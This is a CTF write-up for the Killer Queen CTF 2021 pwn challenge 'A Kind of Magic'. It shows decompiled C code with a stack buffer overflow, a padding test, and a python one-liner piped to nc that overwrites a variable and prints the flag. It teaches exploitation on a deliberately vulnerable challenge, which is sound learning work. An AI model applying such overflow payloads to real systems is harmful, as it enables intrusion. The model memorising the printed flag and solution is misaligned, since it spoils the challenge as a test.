---
layout: writeup
title: A Kind of Magic
ctf: Killer Queen CTF
points: 177
solves: 294
tags: 
    - pwn
date: 2021-11-01
description: |-
    You're a magic man aren't you? Well can you show me?

    [akindofmagic](/assets/CTFs/2021/Killer-Queen-CTF/akindofmagic)
flag: flag{i_hope_its_still_cool_to_use_1337_for_no_reason}
---
<details>
    <summary>tl;dr</summary>
    Basic buffer overflow. Send 44 bytes of padding followed by 1337 to match condition and get flag.
</details>

***

## Introduction

We start by running the binary to see what it does:
<pre 
    class="command-line"
    data-user="kali"
    data-host="kali"
    data-output="2"
><code class="language-bash">./akindofmagic
Is this a kind of magic? What is your magic?:</code>
</pre>

Giving it the input "test", we get the response
<pre 
    class="command-line"
    data-user="kali"
    data-host="kali"
    data-output="1-4"
><code class="language-bash">You entered test

Your magic is: 0
You need to challenge the doors of time</code>
</pre>

We decompile the file with Ghidra, which provides the following decompilation of `main` (I renamed some variables and cleaned it a bit):
```c
int main() {
  char input[44];
  uint magic;
  
  magic = 0;

  puts("Is this a kind of magic? What is your magic?: ");
  fgets(input, 64, stdin);
  printf("You entered %s\n", input);
  printf("Your magic is: %d\n", magic);

  if (magic == 1337) {
    puts("Whoa we got a magic man here!");
    system("cat flag.txt");
  } else {
    puts("You need to challenge the doors of time");
  }
  return 0;
}
```
So the program reads a string of up to 64 characters, prints it back, and prints the 32-bit integer `magic` (initialized to 0). It then checks if `magic == 1337` and if so, we get the flag.

## Vulnerability

Inspecting the code a bit closer, we see the input buffer is 44 bytes, but the program reads up to 64. This means we can overflow the buffer, writing into the next parts of the stack where `magic` is stored. So we can overwrite `magic` and control its value.

We can quickly test this. If we input a string of 44 characters, then the next character will be a newline, which ASCII value in decimal is 10. So we would expect the program to output "Your magic is: 10". Let's try it out:
<pre 
    class="command-line"
    data-user="kali"
    data-host="kali"
    data-output="2-7"
><code class="language-bash">./akindofmagic
Is this a kind of magic? What is your magic?: 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
You entered AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

Your magic is: 10
You need to challenge the doors of time</code>
</pre>
It works as we expected.

## Exploit

We now want to perform the same attack as our simple test case, but want `magic` to be set to 1337, not 10. We can again just send 44 random padding characters, but now append 1337, which in hex is 0x539. We must make sure we send this as a 32-bit integer -- 0x00000539 -- to push the following newline character out of the `magic` variable. In little endian bytes, this value is then `\x39\x05\x00\x00` and we run
<pre 
    class="command-line"
    data-user="kali"
    data-host="kali"
    data-output="2-6"
><code class="language-python">python2 -c "print b'A' * 44 + b'\x39\x05\x00\x00'" | nc 143.198.184.186 5000      
Is this a kind of magic? What is your magic?: 
You entered AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA9
Your magic is: 1337
flag{i_hope_its_still_cool_to_use_1337_for_no_reason}
Whoa we got a magic man here!</code>
</pre>
